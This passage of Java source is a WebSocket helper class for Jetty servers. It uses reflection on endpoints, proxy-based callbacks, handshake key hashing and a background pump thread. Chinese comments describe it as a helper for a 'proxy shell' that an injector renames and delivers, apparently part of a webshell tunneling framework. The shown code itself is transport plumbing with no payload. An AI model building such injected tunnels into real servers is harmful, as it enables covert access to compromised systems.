     * 为 Proxy 壳提供目标端到客户端的异步泵送。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 回调

    /**
     * Jetty 的 Callback 只有 succeeded/failed（9.3+ 加了 default 方法），用 Proxy 实现
     * 就可以只依赖 JDK，不用在 helper 模板里引用 Jetty 类型。等待状态放在
     * {@code Object[]{done, failure}} 里，不引入嵌套类——helper 会被重命名到任意包，
     * 嵌套类不会随注入器下发。
     */
    private Object newCallback(Object[] state) {
        Object callback = Proxy.newProxyInstance(callbackClass.getClassLoader(),
                new Class[]{callbackClass}, this);
        synchronized (callbacks) {
            callbacks.put(callback, state);
        }
        return callback;
    }

    private static Object[] newState() {
        return new Object[]{Boolean.FALSE, null};
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) {
        String name = method.getName();
        if ("hashCode".equals(name)) {
            return Integer.valueOf(System.identityHashCode(proxy));
        }
        if ("equals".equals(name)) {
            return Boolean.valueOf(proxy == (args != null && args.length > 0 ? args[0] : null));
        }
        if ("toString".equals(name)) {
            return "RawWsHelperCallback";
        }
        if ("isNonBlocking".equals(name)) {
            return Boolean.FALSE;
        }
        if ("getInvocationType".equals(name)) {
            return callbackInvocationType;
        }
        if (!"succeeded".equals(name) && !"failed".equals(name) && !"completed".equals(name)) {
            return null;
        }
        Object[] state;
        synchronized (callbacks) {
            state = (Object[]) callbacks.remove(proxy);
        }
        if (state == null) {
            return null;
        }
        if ("failed".equals(name)) {
            finish(state, args != null && args.length > 0 && args[0] instanceof Throwable
                    ? (Throwable) args[0] : new IOException("websocket callback failed"));
        } else {
            finish(state, null);
        }
        return null;
    }

    private static void finish(Object[] state, Throwable throwable) {
        synchronized (state) {
            if (!Boolean.TRUE.equals(state[0])) {
                state[0] = Boolean.TRUE;
                state[1] = throwable;
                state.notifyAll();
            }
        }
    }

    private static boolean isDone(Object[] state) {
        synchronized (state) {
            return Boolean.TRUE.equals(state[0]);
        }
    }

    private static Throwable getFailure(Object[] state) {
        synchronized (state) {
            return (Throwable) state[1];
        }
    }

    private static void await(Object[] state, long millis) throws IOException {
        synchronized (state) {
            if (Boolean.TRUE.equals(state[0])) {
                return;
            }
            try {
                state.wait(millis);
            } catch (InterruptedException e) {
                // 中断是容器在回收线程（shutdown/async 超时），必须终止操作让连接关闭；
                // 重设标志后继续循环会让后续每个 wait/sleep 立即抛出，重试循环变成忙转
                Thread.currentThread().interrupt();
                throw new IOException("interrupted");
            }
        }
    }

    // ---------------------------------------------------------------- 反射工具

    private static boolean isEndPoint(Object target) {
        Class clazz = target.getClass();
        // Jetty 6 BIO 的 endpoint（SocketConnector$Connection）类名不含 EndPoint，
        // 靠祖先类 StreamEndPoint 直接实现的 org.mortbay.io.EndPoint 接口认出来
        if (clazz.getName().indexOf("EndPoint") < 0 && !hasEndPointInterface(clazz)) {
            return false;
        }
        boolean fill = false;
        boolean flush = false;
        boolean close = false;
        Method[] methods = target.getClass().getMethods();
        for (int i = 0; i < methods.length; i++) {
            Method method = methods[i];
            if ("fill".equals(method.getName()) && method.getParameterTypes().length == 1) {
                fill = true;
            } else if ("flush".equals(method.getName())
                    && method.getParameterTypes().length == 1) {
                flush = true;
            } else if ("close".equals(method.getName())
                    && method.getParameterTypes().length == 0) {
                close = true;
            }
        }
        return fill && flush && close;
    }

    private static boolean hasEndPointInterface(Class clazz) {
        while (clazz != null && clazz != Object.class) {
            Class[] interfaces = clazz.getInterfaces();
            for (int i = 0; i < interfaces.length; i++) {
                if ("EndPoint".equals(interfaces[i].getSimpleName())) {
                    return true;
                }
            }
            clazz = clazz.getSuperclass();
        }
        return false;
    }

    private static Method findNamedMethod(Object target, String name, int parameterCount) {
        Method[] methods = target.getClass().getMethods();
        for (int i = 0; i < methods.length; i++) {
            Method method = methods[i];
            if (name.equals(method.getName())
                    && method.getParameterTypes().length == parameterCount) {
                return method;
            }
        }
        return null;
    }

    private static boolean hasMethod(Object target, String name, Class[] parameterTypes) {
        return findMethod(target, name, parameterTypes) != null;
    }

    private static int invokeInt(Method method, Object target, Object[] args) throws IOException {
        try {
            Object result = method.invoke(target, args);
            return result instanceof Integer ? ((Integer) result).intValue() : 0;
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof IOException) {
                throw (IOException) cause;
            }
            throw new IOException("endpoint io failed: " + cause);
        } catch (Throwable t) {
            throw new IOException("endpoint io failed: " + t);
        }
    }

    private static int invokeIntQuietly(Method method, Object target) {
        try {
            Object result = method.invoke(target, new Object[0]);
            return result instanceof Integer ? ((Integer) result).intValue() : 0;
        } catch (Throwable ignored) {
            return 0;
        }
    }

    private static void sleepQuietly() throws IOException {
        try {
            Thread.sleep(1);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("interrupted");
        }
    }

    private static void closeQuietly(Object closeable) {
        if (closeable == null) {
            return;
        }
        try {
            if (closeable instanceof Socket) {
                ((Socket) closeable).close();
            } else if (closeable instanceof InputStream) {
                ((InputStream) closeable).close();
            } else if (closeable instanceof OutputStream) {
                ((OutputStream) closeable).close();
            }
        } catch (Throwable ignored) {
        }
    }

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        if (target == null) {
            return null;
        }
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        if (target == null) {
            return null;
        }
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", byte[].class)
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
